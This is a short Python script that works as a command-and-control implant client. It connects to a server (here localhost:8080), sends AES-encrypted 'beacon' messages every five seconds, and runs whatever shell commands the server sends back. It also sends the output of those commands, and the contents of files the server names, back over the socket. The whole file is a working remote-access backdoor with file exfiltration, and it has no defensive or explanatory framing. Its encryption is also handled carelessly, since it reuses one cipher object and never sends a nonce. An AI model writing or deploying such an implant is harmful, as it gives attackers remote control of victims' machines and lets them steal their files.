from Crypto.Cipher import AES
import socket
import subprocess
import time

# Initialize AES encryption
key = b'Sixteen byte key'
cipher = AES.new(key, AES.MODE_EAX)

# Initialize client socket
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('localhost', 8080))

while True:
    # Send an encrypted beacon to the server
    encrypted_beacon = cipher.encrypt('beacon'.encode())
    client.send(encrypted_beacon)
    time.sleep(5)  # Wait for 5 seconds before the next beacon
    
    # Receive and execute encrypted commands from the server
    encrypted_command_received = client.recv(1024)
    command_received = cipher.decrypt(encrypted_command_received).decode()
    if command_received == 'exit':
        client.close()
        break
    elif command_received.startswith('upload:'):
        filename = command_received.split(':')[1]
        with open(filename, 'rb') as f:
            file_content = f.read()
            encrypted_file_content = cipher.encrypt(file_content)
            client.send(encrypted_file_content)
    elif command_received.startswith('runscript:'):
        script_name = command_received.split(':')[1]
        script_output = subprocess.getoutput(f"python {script_name}")
        encrypted_script_output = cipher.encrypt(script_output.encode())
        client.send(encrypted_script_output)
    else:
        command_output = subprocess.getoutput(command_received)
        encrypted_command_output = cipher.encrypt(command_output.encode())
        client.send(encrypted_command_output)